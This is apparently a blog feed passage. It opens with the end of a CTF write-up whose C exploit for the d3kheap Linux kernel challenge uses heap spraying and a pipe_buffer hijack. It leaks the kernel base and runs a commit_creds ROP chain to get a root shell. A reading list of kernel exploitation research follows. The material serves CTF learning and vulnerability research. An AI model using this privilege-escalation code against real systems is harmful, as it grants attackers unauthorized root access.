<span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>             victim_addr <span class="token operator">+</span> <span class="token number">0x800</span><span class="token punctuation">,</span> victim_addr <span class="token operator">+</span> <span class="token number">0x800</span><span class="token punctuation">,</span> <span class="token comment">// a valid kheap addr is valid</span>            VICTIM_MSG_TYPE<span class="token punctuation">,</span> SECONDARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 释放msg_msg结构</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span>                 <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> VICTIM_MSG_TYPE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to receive secondary msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 喷射pipe_buffer</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> PIPE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to create pipe!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// write something to activate it</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"unr4v31."</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to write the pipe!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 读取sk_buff，也是pipe_buffer结构体，这里直接用read会释放掉所有的sk_buff，方便后续再次分配进行写入</span>    pipe_buf_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">,</span>                     <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">></span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n"</span><span class="token punctuation">,</span>                         pipe_buf_ptr<span class="token operator">-></span>ops<span class="token punctuation">)</span><span class="token punctuation">;</span>                kernel_offset <span class="token operator">=</span> pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">-</span> ANON_PIPE_BUF_OPS<span class="token punctuation">;</span>                kernel_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n"</span><span class="token punctuation">,</span>             kernel_base<span class="token punctuation">,</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*     * Step.5     * 劫持pipe_buffer中的ops，释放所有的pipe_buffer来触发release函数，这样就完成控制流劫持     */</span>    pipe_buf_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span> fake_secondary_msg<span class="token punctuation">;</span>    pipe_buf_ptr<span class="token operator">-></span>page <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"unr4v31."</span><span class="token punctuation">;</span>    pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">=</span> victim_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">;</span>    ops_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ops_ptr<span class="token operator">-></span>release <span class="token operator">=</span> PUSH_RSI_POP_RSP_POP_4VAL_RET <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>    rop_idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    rop_chain <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> POP_RDI_RET<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> INIT_CRED<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> COMMIT_CREDS<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE <span class="token operator">+</span> <span class="token number">22</span><span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"unr4v31."</span><span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"unr4v31."</span><span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> getRootShell<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] spray sk_buff to hijack pipe_buffer..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// for gdb attach only</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] gadget: %p\n"</span><span class="token punctuation">,</span> kernel_offset <span class="token operator">+</span> PUSH_RSI_POP_RSP_POP_4VAL_RET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] free_pipe_info: %p\n"</span><span class="token punctuation">,</span> kernel_offset <span class="token operator">+</span> FREE_PIPE_INFO<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] trigger fake ops->release to hijack RIP..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> PIPE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220927132300854.png" alt="image-20220927132300854"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过以上分析，对msg_msg结构体有了了解：此结构体大小范围比较宽泛，是一个非常好用的结构体，它可以配合其他的结构体完成提权，并且在此过程中学习了内核利用中常用到的堆喷技术。另外，2022网鼎杯玄武组有两道内核PWN也是如出一辙，都是考察msg_msg相关利用。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>【d3kheap下载链接】<a href="https://github.com/arttnba3/D3CTF2022_d3kheap">https://github.com/arttnba3/D3CTF2022_d3kheap</a></p><p>【D^ 3CTF2022 d3kheap 出题手记】<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/</a></p><p>【Linux内核中利用msg_msg结构实现任意地址读写】<a href="https://blog.csdn.net/panhewu9919/article/details/120820617?spm=1001.2014.3001.5502">https://blog.csdn.net/panhewu9919/article/details/120820617?spm=1001.2014.3001.5502</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bug Hunter</title>
      <link href="/2022/08/11/bug-hunter/"/>
      <url>/2022/08/11/bug-hunter/</url>
      
        <content type="html"><![CDATA[<h1 id="Bug-Hunting-in-Hard-Targets"><a href="#Bug-Hunting-in-Hard-Targets" class="headerlink" title="Bug Hunting in Hard Targets"></a>Bug Hunting in Hard Targets</h1><ol><li>Developer mindset vs Adversarial mindset - Code review as a bug hunter is often different from code reviewing as part of feature change. As a bug hunter you are only focusing on how to circumvent a control or use in a way it was not intended. Learning this mindset is key</li><li>Going Deep vs Going Wide - Researching a target there is a trade off between going deep and going wide. If you have no knowledge then going wide helps to discover potential weak areas and build up a mental model. At some point it becomes important to focus down and refine</li><li>Target Biases - Its common to think because something is well established then there will be less bugs lurking there. However, most software is evolving and new features are constant being added. This new code is often a really good source of bugs.</li><li>Fuzzing Enhancements - As code moves on over time, developers need to create test code. This means that often this new code misses test coverage or has no tests at all. Binary diffing, API change logs and software update analysis are a great way to extend fuzzer coverage.</li><li>Code&#x2F;binary review lead fuzzing - It can be very challenging to spot certain bugs using only code review or binary analysis. Combing the approach allows to identify complexity and focus fuzzing to weak areas which may lead to vulns you would have not spotted</li><li>Variant Analysis - As a researcher most of the bugs you find will not be particularly novel and are generally abstractions of a common vulnerability pattern. Knowing how to recognise these patterns and integrating into your toolset to allow faster identification is a must</li><li>Research Tracking - In the area you are researching it is important to keep up-to date on published material. As new attack surfaces are unearthed or new vulnerability classes are identified then taking this knowledge and integrating it into your tooling is important.</li><li>Collaboration - You can get quite far solo in bug hunting, however being able to work in a team allows effective use of the team members specialisation and allows for distribution of work. It helps with motivation on the VR emotional rollercoaster when failure is common.</li><li>Bug Tracking - Whilst going for the most impact as possible is the goal, reaching that goal may require many other lesser impact vulnerabilities chained together. As you are performing your research it is important to make notes of literally anything of potential value.</li><li>Target Knowledge Base - Whilst you are doing this research and afterwards it is important to maintain a target knowledge based. Building on existing knowledge is much easier than coming from zero knowledge of the target. Really helps if you switch between targets lots.</li></ol><h1 id="Windows-Kernel-Exploitation"><a href="#Windows-Kernel-Exploitation" class="headerlink" title="Windows Kernel Exploitation"></a>Windows Kernel Exploitation</h1><ol><li><p>The most complete and recent overview of the Windows Kernel Segment Heap from an exploitation perspective.</p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p></li><li><p>Two articles I wrote on what I assumed was a similar WNF technique seen in the wild to understand how this subsystem could have been abused and the vuln</p><p><a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) - Part 1</a></p><p><a href="https://research.nccgroup.com/2021/08/17/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/">CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) - Part 2</a></p></li><li><p>A use-after-free in clfs.sys, then uses a similar WNF technique as explained in the previous tweet to enable better primitives and techniques mentioned in Scoop the Windows 10 Pool to perform heap grooming. Data only attack escalation</p><p><a href="https://blog.exodusintel.com/2022/03/10/exploiting-a-use-after-free-in-windows-common-logging-file-system-clfs/">Exploiting a use-after-free in Windows Common Logging File System (CLFS) - Exodus Intelligence</a></p></li><li><p>A novel post exploitation primitive unique to Windows 11 22H2+ which can turn an arbitrary write&#x2F;inc into full read and write of kernel memory by abusing I&#x2F;O Ring and its operations. A POC was also released</p><p><a href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">One I&#x2F;O Ring to Rule Them All: A Full Read&#x2F;Write Exploit Primitive on Windows 11</a></p><p><a href="https://github.com/yardenshafir/IoRingReadWritePrimitive">https://github.com/yardenshafir/IoRingReadWritePrimitive</a></p></li><li><p>Win32k has been a huge source of kernel bugs over the years. This talk goes into more than 15 bugs _arkon found and the novel bug class, attack techniques and mitigation by MSFT.</p></li><li><p>Investigates the bug class of arbitrary kernel pointer read (i.e. pointers read from attacker controlled input do not point to userspace). Investigates the true impact (i.e. DOS or second order info leak only?) or code exec &#x2F; LPE</p><p><a href="https://msrc-blog.microsoft.com/2022/03/22/exploring-a-new-class-of-kernel-exploit-primitive/">Exploring a New Class of Kernel Exploit Primitive</a></p></li><li><p>HCVI aims to mitigate an attacker being able too execute unsigned code within the Windows Kernel. 33y0re looks how HVCI affects a typical kernel exploit and shows a way which with arb read&#x2F;write can call kernel functions without triggering HVCI&#x2F;kCFG</p><p><a href="https://connormcgarr.github.io/hvci/">Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG</a></p></li><li><p>In these two a trick to trap access to virtual memory which could be used exploiting certain types of bugs and another on hunting for bugs within Mini-Filter drivers.</p><p><a href="https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html">Windows Exploitation Tricks: Trapping Virtual Memory Access</a></p><p><a href="https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html">Hunting for Bugs in Windows Mini-Filter Drivers</a></p></li><li><p>Actually looking at what Windows vulns are being exploited within the wild (in this case font bugs and CSRSS bug analysis) provides defenders with insights on where to focus their mitigation and detection efforts.</p><p><a href="https://googleprojectzero.blogspot.com/2021/01/in-wild-series-windows-exploits.html">In-the-Wild Series: Windows Exploits</a></p></li><li><p>by rohitwas on finishing off KASLR where previously KUSER_SHARED_DATA was always mapped at a fixed page of memory within the kernel. The post shows strengthening KASLR in Windows by mitigating the last remaining blind-write target RCE could use</p><p><a href="https://msrc-blog.microsoft.com/2022/04/05/randomizing-the-kuser_shared_data-structure-on-windows/">Randomizing the KUSER_SHARED_DATA Structure on Windows</a></p></li></ol><h1 id="Linux-Vulnerability-Research"><a href="#Linux-Vulnerability-Research" class="headerlink" title="Linux Vulnerability Research"></a>Linux Vulnerability Research</h1><ol><li><p>Understanding and Improving Linux Kernel Exploit Reliability</p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p></li><li><p>userfaultfd technique is dead on most Linux distros due to vm.unprivileged_userfaultfd. Fuse has come through as a good replacement for this technique.</p><p><a href="https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">Put an io_uring on it: Exploiting the Linux Kernel</a></p><p><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google’s KCTF Containers</a></p></li><li><p>Syzkaller is a game changer in kernel. There’s a few things to say 1) Even existing publics grammars can find bugs when targeted at areas. 2) Extending coverage is a quick way to find bugs 3) N-day often sits around in <a href="https://syzkaller.appspot.com/upstream">https://syzkaller.appspot.com/upstream</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md">syzkaller&#x2F;syscall_descriptions.md at master · google&#x2F;syzkaller</a></p><p><a href="https://groups.google.com/g/syzkaller/c/YZGN8Ggb_LY/m/h1_uxIEJAgAJ">Tutorial on describing new subsystems</a></p><p><a href="https://xairy.io/articles/syzkaller-external-network">🔍 Looking for Remote Code Execution bugs in the Linux kernel</a></p><p><a href="https://www.collabora.com/news-and-blog/blog/2020/05/12/using-syzkaller-fuzzing-your-changes/">Using syzkaller, part 3: Fuzzing your changes</a></p><p><a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/syzkaller_crash_demo.md">Debian-GNU-Linux-Profiles&#x2F;syzkaller_crash_demo.md at master · hardenedlinux&#x2F;Debian-GNU-Linux-Profiles</a></p><p><a href="https://seclists.org/oss-sec/2022/q2/164?utm_source=dlvr.it&utm_medium=twitter">CVE-2022-1972: out-of-bound write in Linux netfilter subsystem leads to local privilege escalation</a></p></li><li><p>So N-day often just sitting around.. KCTF encourages researchers to triage existing bugs and develop new techniques to bypass existing mitigations</p><p><a href="https://security.googleblog.com/2021/11/trick-treat-paying-leets-and-sweets-for.html">Trick &amp; Treat! 🎃 Paying Leets and Sweets for Linux Kernel privescs and k8s escapes</a></p><p>both 0-day&#x2F;N-day. As a researcher you can learn a lot from past bugs:</p><p><a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml">public kCTF Responses - Google Drive</a></p></li><li><p>Keeping on top of mitigations in your head is hard. Especially if you are working on multiple platforms.</p><p><a href="https://github.com/nccgroup/exploit_mitigations">https://github.com/nccgroup/exploit_mitigations</a></p><p>to try to help track these. Really early days, but any contributions appreciated!</p></li><li><p>Finding the correct size structures with elements you want to control at certain offsets with them is tedious and time consuming. CodeQL massively helps speed up this process.mmolgtm article</p><p><a href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">One day short of a full chain: Part 1 - Android Kernel arbitrary code execution</a></p><p>shows a query which can be used for this.</p></li><li><p>The msg_msg technique which has been a favorite by exploit writes used in</p><p><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google’s KCTF Containers</a></p><p><a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">CVE-2021-22555: Turning \x00\x00 into 10000$</a></p><p><a href="https://nickgregory.me/post/2022/03/12/cve-2022-25636/">The Discovery and Exploitation of CVE-2022-25636</a></p><p>becomes less useful in 5.14 when GFP_KERNEL_ACCOUNT end up in kmalloc-cg-* caches and your vulnerable object is not.</p></li><li><p>Talking of kmalloc cache’s, cross-cache attacks are a thing and can be used when its not possible to find an interesting object within your initial target cache. Markak_ describes this and other factors to consider when evaluating AUTOSLAB</p><p><a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game">How AUTOSLAB Changes the Memory Unsafety Game</a></p></li><li><p>This list wouldn’t be complete andreyknvl and a13xp0p0v with linkersec and</p><p><a href="https://github.com/xairy/linux-kernel-exploitation">https://github.com/xairy/linux-kernel-exploitation</a></p><p>which goes into way more things going back over the years.</p></li><li><p>Finally, if this kind of research interests you! My team at nccgroupinfosec position open currently at</p><p><a href="https://nccgroup.wd3.myworkdayjobs.com/en-US/NCC_Group/job/UK-Remote/Exploit-Developer_R6065">Exploit Developer</a></p></li></ol><h1 id="macOS-vulnerability-research"><a href="#macOS-vulnerability-research" class="headerlink" title="macOS vulnerability research"></a>macOS vulnerability research</h1><p><a href="https://twitter.com/alexjplaskett/status/1472874802037862407">Alex Plaskett on Twitter: “1&#x2F;18 As 2021 is starting to come towards and end, now seems to be good time to look back at all the great macOS vulnerability research &#x2F; exploit development published during the year! Tried to keep to macOS mainly but obviously there’s some crossover with iOS research too. 🧵 &#x2F; Twitter”</a></p><h1 